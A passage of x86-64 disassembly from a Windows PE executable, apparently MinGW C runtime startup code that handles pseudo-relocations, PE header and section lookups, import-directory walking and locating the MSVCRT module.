  40467d:	ba 30 00 00 00       	mov    $0x30,%edx
  404682:	e8 79 fd ff ff       	call   0x404400
  404687:	90                   	nop
  404688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40468f:	00 
  404690:	55                   	push   %rbp
  404691:	48 89 e5             	mov    %rsp,%rbp
  404694:	41 54                	push   %r12
  404696:	57                   	push   %rdi
  404697:	56                   	push   %rsi
  404698:	53                   	push   %rbx
  404699:	48 83 ec 60          	sub    $0x60,%rsp
  40469d:	8b 1d cd 7c 0d 00    	mov    0xd7ccd(%rip),%ebx        # 0x4dc370
  4046a3:	85 db                	test   %ebx,%ebx
  4046a5:	74 0b                	je     0x4046b2
  4046a7:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  4046ab:	5b                   	pop    %rbx
  4046ac:	5e                   	pop    %rsi
  4046ad:	5f                   	pop    %rdi
  4046ae:	41 5c                	pop    %r12
  4046b0:	5d                   	pop    %rbp
  4046b1:	c3                   	ret
  4046b2:	c7 05 b4 7c 0d 00 01 	movl   $0x1,0xd7cb4(%rip)        # 0x4dc370
  4046b9:	00 00 00 
  4046bc:	e8 0f 04 00 00       	call   0x404ad0
  4046c1:	48 98                	cltq
  4046c3:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  4046c7:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
  4046ce:	00 
  4046cf:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  4046d3:	e8 38 0b 00 00       	call   0x405210
  4046d8:	48 8d 35 b1 55 0d 00 	lea    0xd55b1(%rip),%rsi        # 0x4d9c90
  4046df:	48 8d 1d aa 55 0d 00 	lea    0xd55aa(%rip),%rbx        # 0x4d9c90
  4046e6:	c7 05 90 7c 0d 00 00 	movl   $0x0,0xd7c90(%rip)        # 0x4dc380
  4046ed:	00 00 00 
  4046f0:	48 29 c4             	sub    %rax,%rsp
  4046f3:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  4046f8:	48 89 05 79 7c 0d 00 	mov    %rax,0xd7c79(%rip)        # 0x4dc378
  4046ff:	48 89 f0             	mov    %rsi,%rax
  404702:	48 29 d8             	sub    %rbx,%rax
  404705:	48 83 f8 07          	cmp    $0x7,%rax
  404709:	7e 9c                	jle    0x4046a7
  40470b:	48 83 f8 0b          	cmp    $0xb,%rax
  40470f:	7e 33                	jle    0x404744
  404711:	44 8b 1d 78 55 0d 00 	mov    0xd5578(%rip),%r11d        # 0x4d9c90
  404718:	45 85 db             	test   %r11d,%r11d
  40471b:	0f 85 9f 00 00 00    	jne    0x4047c0
  404721:	44 8b 15 6c 55 0d 00 	mov    0xd556c(%rip),%r10d        # 0x4d9c94
  404728:	45 85 d2             	test   %r10d,%r10d
  40472b:	0f 85 8f 00 00 00    	jne    0x4047c0
  404731:	44 8b 0d 60 55 0d 00 	mov    0xd5560(%rip),%r9d        # 0x4d9c98
  404738:	45 85 c9             	test   %r9d,%r9d
  40473b:	75 16                	jne    0x404753
  40473d:	48 8d 1d 58 55 0d 00 	lea    0xd5558(%rip),%rbx        # 0x4d9c9c
  404744:	44 8b 03             	mov    (%rbx),%r8d
  404747:	45 85 c0             	test   %r8d,%r8d
  40474a:	75 74                	jne    0x4047c0
  40474c:	8b 4b 04             	mov    0x4(%rbx),%ecx
  40474f:	85 c9                	test   %ecx,%ecx
  404751:	75 6d                	jne    0x4047c0
  404753:	8b 53 08             	mov    0x8(%rbx),%edx
  404756:	83 fa 01             	cmp    $0x1,%edx
  404759:	0f 85 0e 02 00 00    	jne    0x40496d
  40475f:	48 83 c3 0c          	add    $0xc,%rbx
  404763:	48 39 f3             	cmp    %rsi,%rbx
  404766:	0f 83 3b ff ff ff    	jae    0x4046a7
  40476c:	48 8d 3d 8d b8 ff ff 	lea    -0x4773(%rip),%rdi        # 0x400000
  404773:	49 bc 00 00 00 00 ff 	movabs $0xffffffff00000000,%r12
  40477a:	ff ff ff 
  40477d:	8b 4b 04             	mov    0x4(%rbx),%ecx
  404780:	8b 03                	mov    (%rbx),%eax
  404782:	0f b6 53 08          	movzbl 0x8(%rbx),%edx
  404786:	48 01 f8             	add    %rdi,%rax
  404789:	48 01 f9             	add    %rdi,%rcx
  40478c:	83 fa 10             	cmp    $0x10,%edx
  40478f:	4c 8b 00             	mov    (%rax),%r8
  404792:	0f 84 1d 01 00 00    	je     0x4048b5
  404798:	0f 87 da 00 00 00    	ja     0x404878
  40479e:	83 fa 08             	cmp    $0x8,%edx
  4047a1:	0f 84 43 01 00 00    	je     0x4048ea
  4047a7:	48 8d 0d 7a 50 0d 00 	lea    0xd507a(%rip),%rcx        # 0x4d9828
  4047ae:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  4047b5:	00 
  4047b6:	e8 45 fc ff ff       	call   0x404400
  4047bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4047c0:	48 39 f3             	cmp    %rsi,%rbx
  4047c3:	0f 83 de fe ff ff    	jae    0x4046a7
  4047c9:	48 8d 3d 30 b8 ff ff 	lea    -0x47d0(%rip),%rdi        # 0x400000
  4047d0:	8b 4b 04             	mov    0x4(%rbx),%ecx
  4047d3:	48 8d 55 a4          	lea    -0x5c(%rbp),%rdx
  4047d7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  4047dd:	48 01 f9             	add    %rdi,%rcx
  4047e0:	8b 01                	mov    (%rcx),%eax
  4047e2:	03 03                	add    (%rbx),%eax
  4047e4:	48 83 c3 08          	add    $0x8,%rbx
  4047e8:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  4047eb:	e8 70 fc ff ff       	call   0x404460
  4047f0:	48 39 f3             	cmp    %rsi,%rbx
  4047f3:	72 db                	jb     0x4047d0
  4047f5:	8b 05 85 7b 0d 00    	mov    0xd7b85(%rip),%eax        # 0x4dc380
  4047fb:	31 db                	xor    %ebx,%ebx
  4047fd:	31 f6                	xor    %esi,%esi
  4047ff:	85 c0                	test   %eax,%eax
  404801:	0f 8e a0 fe ff ff    	jle    0x4046a7
  404807:	4c 8b 25 8a 9e 0d 00 	mov    0xd9e8a(%rip),%r12        # 0x4de698
  40480e:	48 8b 3d 7b 9e 0d 00 	mov    0xd9e7b(%rip),%rdi        # 0x4de690
  404815:	eb 1c                	jmp    0x404833
  404817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40481e:	00 00 
  404820:	83 c6 01             	add    $0x1,%esi
  404823:	48 83 c3 18          	add    $0x18,%rbx
  404827:	3b 35 53 7b 0d 00    	cmp    0xd7b53(%rip),%esi        # 0x4dc380
  40482d:	0f 8d 74 fe ff ff    	jge    0x4046a7
  404833:	48 8b 05 3e 7b 0d 00 	mov    0xd7b3e(%rip),%rax        # 0x4dc378
  40483a:	48 01 d8             	add    %rbx,%rax
  40483d:	8b 10                	mov    (%rax),%edx
  40483f:	85 d2                	test   %edx,%edx
  404841:	74 dd                	je     0x404820
  404843:	48 8b 48 08          	mov    0x8(%rax),%rcx
  404847:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  40484d:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
  404851:	41 ff d4             	call   *%r12
  404854:	48 85 c0             	test   %rax,%rax
  404857:	0f 84 f2 00 00 00    	je     0x40494f
  40485d:	48 8b 05 14 7b 0d 00 	mov    0xd7b14(%rip),%rax        # 0x4dc378
  404864:	4c 8d 4d a4          	lea    -0x5c(%rbp),%r9
  404868:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  40486c:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  404870:	44 8b 04 18          	mov    (%rax,%rbx,1),%r8d
  404874:	ff d7                	call   *%rdi
  404876:	eb a8                	jmp    0x404820
  404878:	83 fa 20             	cmp    $0x20,%edx
  40487b:	0f 84 9d 00 00 00    	je     0x40491e
  404881:	83 fa 40             	cmp    $0x40,%edx
  404884:	0f 85 1d ff ff ff    	jne    0x4047a7
  40488a:	49 29 c0             	sub    %rax,%r8
  40488d:	4c 03 01             	add    (%rcx),%r8
  404890:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  404894:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  404898:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  40489e:	e8 bd fb ff ff       	call   0x404460
  4048a3:	48 83 c3 0c          	add    $0xc,%rbx
  4048a7:	48 39 f3             	cmp    %rsi,%rbx
  4048aa:	0f 82 cd fe ff ff    	jb     0x40477d
  4048b0:	e9 40 ff ff ff       	jmp    0x4047f5
  4048b5:	44 0f b7 09          	movzwl (%rcx),%r9d
  4048b9:	41 0f b7 d1          	movzwl %r9w,%edx
  4048bd:	49 89 d2             	mov    %rdx,%r10
  4048c0:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  4048c7:	66 45 85 c9          	test   %r9w,%r9w
  4048cb:	49 0f 48 d2          	cmovs  %r10,%rdx
  4048cf:	48 29 c2             	sub    %rax,%rdx
  4048d2:	4c 01 c2             	add    %r8,%rdx
  4048d5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  4048db:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  4048df:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  4048e3:	e8 78 fb ff ff       	call   0x404460
  4048e8:	eb b9                	jmp    0x4048a3
  4048ea:	44 0f b6 09          	movzbl (%rcx),%r9d
  4048ee:	41 0f b6 d1          	movzbl %r9b,%edx
  4048f2:	49 89 d2             	mov    %rdx,%r10
  4048f5:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  4048fc:	45 84 c9             	test   %r9b,%r9b
  4048ff:	49 0f 48 d2          	cmovs  %r10,%rdx
  404903:	48 29 c2             	sub    %rax,%rdx
  404906:	4c 01 c2             	add    %r8,%rdx
  404909:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40490f:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  404913:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  404917:	e8 44 fb ff ff       	call   0x404460
  40491c:	eb 85                	jmp    0x4048a3
  40491e:	44 8b 09             	mov    (%rcx),%r9d
  404921:	44 89 ca             	mov    %r9d,%edx
  404924:	49 89 d2             	mov    %rdx,%r10
  404927:	4d 09 e2             	or     %r12,%r10
  40492a:	45 85 c9             	test   %r9d,%r9d
  40492d:	49 0f 48 d2          	cmovs  %r10,%rdx
  404931:	48 29 c2             	sub    %rax,%rdx
  404934:	4c 01 c2             	add    %r8,%rdx
  404937:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40493d:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  404941:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
  404945:	e8 16 fb ff ff       	call   0x404460
  40494a:	e9 54 ff ff ff       	jmp    0x4048a3
  40494f:	48 03 1d 22 7a 0d 00 	add    0xd7a22(%rip),%rbx        # 0x4dc378
  404956:	48 8d 0d 33 4e 0d 00 	lea    0xd4e33(%rip),%rcx        # 0x4d9790
  40495d:	48 8b 43 10          	mov    0x10(%rbx),%rax
  404961:	4c 8b 43 08          	mov    0x8(%rbx),%r8
  404965:	8b 50 08             	mov    0x8(%rax),%edx
  404968:	e8 93 fa ff ff       	call   0x404400
  40496d:	48 8d 0d 7c 4e 0d 00 	lea    0xd4e7c(%rip),%rcx        # 0x4d97f0
  404974:	e8 87 fa ff ff       	call   0x404400
  404979:	90                   	nop
  40497a:	90                   	nop
  40497b:	90                   	nop
  40497c:	90                   	nop
  40497d:	90                   	nop
  40497e:	90                   	nop
  40497f:	90                   	nop
  404980:	31 c0                	xor    %eax,%eax
  404982:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  404987:	74 07                	je     0x404990
  404989:	f3 c3                	repz ret
  40498b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404990:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
  404994:	48 01 d1             	add    %rdx,%rcx
  404997:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  40499d:	75 ea                	jne    0x404989
  40499f:	31 c0                	xor    %eax,%eax
  4049a1:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  4049a7:	0f 94 c0             	sete   %al
  4049aa:	c3                   	ret
  4049ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4049b0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4049b4:	48 01 c1             	add    %rax,%rcx
  4049b7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  4049bb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  4049c0:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  4049c4:	85 c9                	test   %ecx,%ecx
  4049c6:	74 28                	je     0x4049f0
  4049c8:	8d 49 ff             	lea    -0x1(%rcx),%ecx
  4049cb:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  4049cf:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  4049d4:	8b 48 0c             	mov    0xc(%rax),%ecx
  4049d7:	41 89 c8             	mov    %ecx,%r8d
  4049da:	49 39 d0             	cmp    %rdx,%r8
  4049dd:	77 08                	ja     0x4049e7
  4049df:	03 48 08             	add    0x8(%rax),%ecx
  4049e2:	48 39 ca             	cmp    %rcx,%rdx
  4049e5:	72 0b                	jb     0x4049f2
  4049e7:	48 83 c0 28          	add    $0x28,%rax
  4049eb:	4c 39 c8             	cmp    %r9,%rax
  4049ee:	75 e4                	jne    0x4049d4
  4049f0:	31 c0                	xor    %eax,%eax
  4049f2:	f3 c3                	repz ret
  4049f4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  4049fb:	00 00 00 00 00 
  404a00:	57                   	push   %rdi
  404a01:	56                   	push   %rsi
  404a02:	53                   	push   %rbx
  404a03:	48 83 ec 20          	sub    $0x20,%rsp
  404a07:	48 89 ce             	mov    %rcx,%rsi
  404a0a:	e8 69 55 00 00       	call   0x409f78
  404a0f:	48 83 f8 08          	cmp    $0x8,%rax
  404a13:	77 6b                	ja     0x404a80
  404a15:	48 8d 0d e4 b5 ff ff 	lea    -0x4a1c(%rip),%rcx        # 0x400000
  404a1c:	e8 5f ff ff ff       	call   0x404980
  404a21:	85 c0                	test   %eax,%eax
  404a23:	74 5b                	je     0x404a80
  404a25:	48 63 15 10 b6 ff ff 	movslq -0x49f0(%rip),%rdx        # 0x40003c
  404a2c:	48 8d 05 cd b5 ff ff 	lea    -0x4a33(%rip),%rax        # 0x400000
  404a33:	48 01 d0             	add    %rdx,%rax
  404a36:	0f b7 50 14          	movzwl 0x14(%rax),%edx
  404a3a:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
  404a3f:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  404a43:	85 c0                	test   %eax,%eax
  404a45:	74 39                	je     0x404a80
  404a47:	8d 40 ff             	lea    -0x1(%rax),%eax
  404a4a:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  404a4e:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  404a53:	eb 09                	jmp    0x404a5e
  404a55:	48 83 c3 28          	add    $0x28,%rbx
  404a59:	48 39 fb             	cmp    %rdi,%rbx
  404a5c:	74 22                	je     0x404a80
  404a5e:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  404a64:	48 89 f2             	mov    %rsi,%rdx
  404a67:	48 89 d9             	mov    %rbx,%rcx
  404a6a:	e8 f1 55 00 00       	call   0x40a060
  404a6f:	85 c0                	test   %eax,%eax
  404a71:	75 e2                	jne    0x404a55
  404a73:	48 89 d8             	mov    %rbx,%rax
  404a76:	48 83 c4 20          	add    $0x20,%rsp
  404a7a:	5b                   	pop    %rbx
  404a7b:	5e                   	pop    %rsi
  404a7c:	5f                   	pop    %rdi
  404a7d:	c3                   	ret
  404a7e:	66 90                	xchg   %ax,%ax
  404a80:	31 db                	xor    %ebx,%ebx
  404a82:	48 89 d8             	mov    %rbx,%rax
  404a85:	48 83 c4 20          	add    $0x20,%rsp
  404a89:	5b                   	pop    %rbx
  404a8a:	5e                   	pop    %rsi
  404a8b:	5f                   	pop    %rdi
  404a8c:	c3                   	ret
  404a8d:	0f 1f 00             	nopl   (%rax)
  404a90:	53                   	push   %rbx
  404a91:	48 83 ec 20          	sub    $0x20,%rsp
  404a95:	48 89 cb             	mov    %rcx,%rbx
  404a98:	48 8d 0d 61 b5 ff ff 	lea    -0x4a9f(%rip),%rcx        # 0x400000
  404a9f:	e8 dc fe ff ff       	call   0x404980
  404aa4:	85 c0                	test   %eax,%eax
  404aa6:	74 18                	je     0x404ac0
  404aa8:	48 8d 0d 51 b5 ff ff 	lea    -0x4aaf(%rip),%rcx        # 0x400000
  404aaf:	48 89 da             	mov    %rbx,%rdx
  404ab2:	48 29 ca             	sub    %rcx,%rdx
  404ab5:	48 83 c4 20          	add    $0x20,%rsp
  404ab9:	5b                   	pop    %rbx
  404aba:	e9 f1 fe ff ff       	jmp    0x4049b0
  404abf:	90                   	nop
  404ac0:	31 c0                	xor    %eax,%eax
  404ac2:	48 83 c4 20          	add    $0x20,%rsp
  404ac6:	5b                   	pop    %rbx
  404ac7:	c3                   	ret
  404ac8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404acf:	00 
  404ad0:	48 83 ec 28          	sub    $0x28,%rsp
  404ad4:	48 8d 0d 25 b5 ff ff 	lea    -0x4adb(%rip),%rcx        # 0x400000
  404adb:	e8 a0 fe ff ff       	call   0x404980
  404ae0:	31 d2                	xor    %edx,%edx
  404ae2:	85 c0                	test   %eax,%eax
  404ae4:	74 13                	je     0x404af9
  404ae6:	48 63 05 4f b5 ff ff 	movslq -0x4ab1(%rip),%rax        # 0x40003c
  404aed:	48 8d 15 0c b5 ff ff 	lea    -0x4af4(%rip),%rdx        # 0x400000
  404af4:	0f b7 54 02 06       	movzwl 0x6(%rdx,%rax,1),%edx
  404af9:	89 d0                	mov    %edx,%eax
  404afb:	48 83 c4 28          	add    $0x28,%rsp
  404aff:	c3                   	ret
  404b00:	53                   	push   %rbx
  404b01:	48 83 ec 20          	sub    $0x20,%rsp
  404b05:	48 89 cb             	mov    %rcx,%rbx
  404b08:	48 8d 0d f1 b4 ff ff 	lea    -0x4b0f(%rip),%rcx        # 0x400000
  404b0f:	e8 6c fe ff ff       	call   0x404980
  404b14:	85 c0                	test   %eax,%eax
  404b16:	74 50                	je     0x404b68
  404b18:	48 63 15 1d b5 ff ff 	movslq -0x4ae3(%rip),%rdx        # 0x40003c
  404b1f:	48 8d 05 da b4 ff ff 	lea    -0x4b26(%rip),%rax        # 0x400000
  404b26:	48 01 c2             	add    %rax,%rdx
  404b29:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
  404b2d:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
  404b32:	0f b7 52 06          	movzwl 0x6(%rdx),%edx
  404b36:	85 d2                	test   %edx,%edx
  404b38:	74 2e                	je     0x404b68
  404b3a:	8d 52 ff             	lea    -0x1(%rdx),%edx
  404b3d:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  404b41:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
  404b46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  404b4d:	00 00 00 
  404b50:	f6 40 27 20          	testb  $0x20,0x27(%rax)
  404b54:	74 09                	je     0x404b5f
  404b56:	48 85 db             	test   %rbx,%rbx
  404b59:	74 0f                	je     0x404b6a
  404b5b:	48 83 eb 01          	sub    $0x1,%rbx
  404b5f:	48 83 c0 28          	add    $0x28,%rax
  404b63:	48 39 d0             	cmp    %rdx,%rax
  404b66:	75 e8                	jne    0x404b50
  404b68:	31 c0                	xor    %eax,%eax
  404b6a:	48 83 c4 20          	add    $0x20,%rsp
  404b6e:	5b                   	pop    %rbx
  404b6f:	c3                   	ret
  404b70:	48 83 ec 28          	sub    $0x28,%rsp
  404b74:	48 8d 0d 85 b4 ff ff 	lea    -0x4b7b(%rip),%rcx        # 0x400000
  404b7b:	e8 00 fe ff ff       	call   0x404980
  404b80:	31 d2                	xor    %edx,%edx
  404b82:	85 c0                	test   %eax,%eax
  404b84:	48 8d 05 75 b4 ff ff 	lea    -0x4b8b(%rip),%rax        # 0x400000
  404b8b:	48 0f 45 d0          	cmovne %rax,%rdx
  404b8f:	48 89 d0             	mov    %rdx,%rax
  404b92:	48 83 c4 28          	add    $0x28,%rsp
  404b96:	c3                   	ret
  404b97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404b9e:	00 00 
  404ba0:	56                   	push   %rsi
  404ba1:	53                   	push   %rbx
  404ba2:	48 83 ec 28          	sub    $0x28,%rsp
  404ba6:	31 db                	xor    %ebx,%ebx
  404ba8:	48 89 ce             	mov    %rcx,%rsi
  404bab:	48 8d 0d 4e b4 ff ff 	lea    -0x4bb2(%rip),%rcx        # 0x400000
  404bb2:	e8 c9 fd ff ff       	call   0x404980
  404bb7:	85 c0                	test   %eax,%eax
  404bb9:	75 09                	jne    0x404bc4
  404bbb:	89 d8                	mov    %ebx,%eax
  404bbd:	48 83 c4 28          	add    $0x28,%rsp
  404bc1:	5b                   	pop    %rbx
  404bc2:	5e                   	pop    %rsi
  404bc3:	c3                   	ret
  404bc4:	48 8d 0d 35 b4 ff ff 	lea    -0x4bcb(%rip),%rcx        # 0x400000
  404bcb:	48 89 f2             	mov    %rsi,%rdx
  404bce:	48 29 ca             	sub    %rcx,%rdx
  404bd1:	e8 da fd ff ff       	call   0x4049b0
  404bd6:	48 85 c0             	test   %rax,%rax
  404bd9:	74 e0                	je     0x404bbb
  404bdb:	8b 58 24             	mov    0x24(%rax),%ebx
  404bde:	f7 d3                	not    %ebx
  404be0:	c1 eb 1f             	shr    $0x1f,%ebx
  404be3:	89 d8                	mov    %ebx,%eax
  404be5:	48 83 c4 28          	add    $0x28,%rsp
  404be9:	5b                   	pop    %rbx
  404bea:	5e                   	pop    %rsi
  404beb:	c3                   	ret
  404bec:	0f 1f 40 00          	nopl   0x0(%rax)
  404bf0:	55                   	push   %rbp
  404bf1:	57                   	push   %rdi
  404bf2:	56                   	push   %rsi
  404bf3:	53                   	push   %rbx
  404bf4:	48 83 ec 28          	sub    $0x28,%rsp
  404bf8:	89 cb                	mov    %ecx,%ebx
  404bfa:	48 8d 0d ff b3 ff ff 	lea    -0x4c01(%rip),%rcx        # 0x400000
  404c01:	e8 7a fd ff ff       	call   0x404980
  404c06:	85 c0                	test   %eax,%eax
  404c08:	74 66                	je     0x404c70
  404c0a:	48 63 05 2b b4 ff ff 	movslq -0x4bd5(%rip),%rax        # 0x40003c
  404c11:	48 8d 35 e8 b3 ff ff 	lea    -0x4c18(%rip),%rsi        # 0x400000
  404c18:	31 ed                	xor    %ebp,%ebp
  404c1a:	8b bc 06 90 00 00 00 	mov    0x90(%rsi,%rax,1),%edi
  404c21:	85 ff                	test   %edi,%edi
  404c23:	74 3a                	je     0x404c5f
  404c25:	48 89 fa             	mov    %rdi,%rdx
  404c28:	48 89 f1             	mov    %rsi,%rcx
  404c2b:	e8 80 fd ff ff       	call   0x4049b0
  404c30:	48 85 c0             	test   %rax,%rax
  404c33:	74 2a                	je     0x404c5f
  404c35:	48 89 fa             	mov    %rdi,%rdx
  404c38:	48 01 f2             	add    %rsi,%rdx
  404c3b:	75 0a                	jne    0x404c47
  404c3d:	eb 20                	jmp    0x404c5f
  404c3f:	90                   	nop
  404c40:	83 eb 01             	sub    $0x1,%ebx
  404c43:	48 83 c2 14          	add    $0x14,%rdx
  404c47:	8b 4a 04             	mov    0x4(%rdx),%ecx
  404c4a:	85 c9                	test   %ecx,%ecx
  404c4c:	75 07                	jne    0x404c55
  404c4e:	8b 42 0c             	mov    0xc(%rdx),%eax
  404c51:	85 c0                	test   %eax,%eax
  404c53:	74 1b                	je     0x404c70
  404c55:	85 db                	test   %ebx,%ebx
  404c57:	7f e7                	jg     0x404c40
  404c59:	8b 6a 0c             	mov    0xc(%rdx),%ebp
  404c5c:	48 01 f5             	add    %rsi,%rbp
  404c5f:	48 89 e8             	mov    %rbp,%rax
  404c62:	48 83 c4 28          	add    $0x28,%rsp
  404c66:	5b                   	pop    %rbx
  404c67:	5e                   	pop    %rsi
  404c68:	5f                   	pop    %rdi
  404c69:	5d                   	pop    %rbp
  404c6a:	c3                   	ret
  404c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404c70:	31 ed                	xor    %ebp,%ebp
  404c72:	48 89 e8             	mov    %rbp,%rax
  404c75:	48 83 c4 28          	add    $0x28,%rsp
  404c79:	5b                   	pop    %rbx
  404c7a:	5e                   	pop    %rsi
  404c7b:	5f                   	pop    %rdi
  404c7c:	5d                   	pop    %rbp
  404c7d:	c3                   	ret
  404c7e:	66 90                	xchg   %ax,%ax
  404c80:	53                   	push   %rbx
  404c81:	48 83 ec 20          	sub    $0x20,%rsp
  404c85:	48 8b 05 04 77 0d 00 	mov    0xd7704(%rip),%rax        # 0x4dc390
  404c8c:	48 85 c0             	test   %rax,%rax
  404c8f:	74 0f                	je     0x404ca0
  404c91:	48 83 c4 20          	add    $0x20,%rsp
  404c95:	5b                   	pop    %rbx
  404c96:	c3                   	ret
  404c97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404c9e:	00 00 
  404ca0:	31 c9                	xor    %ecx,%ecx
  404ca2:	8d 59 01             	lea    0x1(%rcx),%ebx
  404ca5:	e8 46 ff ff ff       	call   0x404bf0
  404caa:	48 85 c0             	test   %rax,%rax
  404cad:	74 71                	je     0x404d20
  404caf:	0f b6 10             	movzbl (%rax),%edx
  404cb2:	83 e2 df             	and    $0xffffffdf,%edx
  404cb5:	80 fa 4d             	cmp    $0x4d,%dl
  404cb8:	75 46                	jne    0x404d00
  404cba:	0f b6 50 01          	movzbl 0x1(%rax),%edx
  404cbe:	83 e2 df             	and    $0xffffffdf,%edx
  404cc1:	80 fa 53             	cmp    $0x53,%dl
  404cc4:	75 3a                	jne    0x404d00
  404cc6:	0f b6 50 02          	movzbl 0x2(%rax),%edx
  404cca:	83 e2 df             	and    $0xffffffdf,%edx
  404ccd:	80 fa 56             	cmp    $0x56,%dl
  404cd0:	75 2e                	jne    0x404d00
  404cd2:	0f b6 50 03          	movzbl 0x3(%rax),%edx
  404cd6:	83 e2 df             	and    $0xffffffdf,%edx
  404cd9:	80 fa 43             	cmp    $0x43,%dl
  404cdc:	75 22                	jne    0x404d00
  404cde:	0f b6 50 04          	movzbl 0x4(%rax),%edx
  404ce2:	83 e2 df             	and    $0xffffffdf,%edx
  404ce5:	80 fa 52             	cmp    $0x52,%dl
  404ce8:	75 16                	jne    0x404d00
  404cea:	0f b6 50 05          	movzbl 0x5(%rax),%edx
  404cee:	89 d1                	mov    %edx,%ecx
  404cf0:	83 e1 df             	and    $0xffffffdf,%ecx
  404cf3:	80 f9 54             	cmp    $0x54,%cl
  404cf6:	74 0c                	je     0x404d04
  404cf8:	83 ea 30             	sub    $0x30,%edx
  404cfb:	80 fa 09             	cmp    $0x9,%dl
  404cfe:	76 04                	jbe    0x404d04
  404d00:	89 d9                	mov    %ebx,%ecx
  404d02:	eb 9e                	jmp    0x404ca2
  404d04:	48 89 c1             	mov    %rax,%rcx
  404d07:	ff 15 b3 98 0d 00    	call   *0xd98b3(%rip)        # 0x4de5c0
  404d0d:	48 85 c0             	test   %rax,%rax
  404d10:	48 89 05 79 76 0d 00 	mov    %rax,0xd7679(%rip)        # 0x4dc390
  404d17:	0f 85 74 ff ff ff    	jne    0x404c91
  404d1d:	0f 1f 00             	nopl   (%rax)
  404d20:	48 8d 0d 39 4b 0d 00 	lea    0xd4b39(%rip),%rcx        # 0x4d9860
  404d27:	ff 15 eb 98 0d 00    	call   *0xd98eb(%rip)        # 0x4de618
  404d2d:	48 89 05 5c 76 0d 00 	mov    %rax,0xd765c(%rip)        # 0x4dc390
  404d34:	e9 58 ff ff ff       	jmp    0x404c91
  404d39:	90                   	nop
  404d3a:	90                   	nop
  404d3b:	90                   	nop
  404d3c:	90                   	nop
  404d3d:	90                   	nop
  404d3e:	90                   	nop
  404d3f:	90                   	nop
  404d40:	db e3                	fninit
  404d42:	c3                   	ret
  404d43:	90                   	nop
  404d44:	90                   	nop
  404d45:	90                   	nop
  404d46:	90                   	nop
  404d47:	90                   	nop
  404d48:	90                   	nop
  404d49:	90                   	nop
  404d4a:	90                   	nop
  404d4b:	90                   	nop
  404d4c:	90                   	nop
  404d4d:	90                   	nop
  404d4e:	90                   	nop
  404d4f:	90                   	nop
  404d50:	48 83 ec 28          	sub    $0x28,%rsp
  404d54:	48 8b 05 75 41 0d 00 	mov    0xd4175(%rip),%rax        # 0x4d8ed0
  404d5b:	48 8b 00             	mov    (%rax),%rax
  404d5e:	48 85 c0             	test   %rax,%rax
  404d61:	74 1d                	je     0x404d80
  404d63:	ff d0                	call   *%rax
  404d65:	48 8b 05 64 41 0d 00 	mov    0xd4164(%rip),%rax        # 0x4d8ed0
  404d6c:	48 8d 50 08          	lea    0x8(%rax),%rdx
  404d70:	48 8b 40 08          	mov    0x8(%rax),%rax
  404d74:	48 89 15 55 41 0d 00 	mov    %rdx,0xd4155(%rip)        # 0x4d8ed0
  404d7b:	48 85 c0             	test   %rax,%rax
  404d7e:	75 e3                	jne    0x404d63
  404d80:	48 83 c4 28          	add    $0x28,%rsp
  404d84:	c3                   	ret
  404d85:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  404d8c:	00 00 00 00 
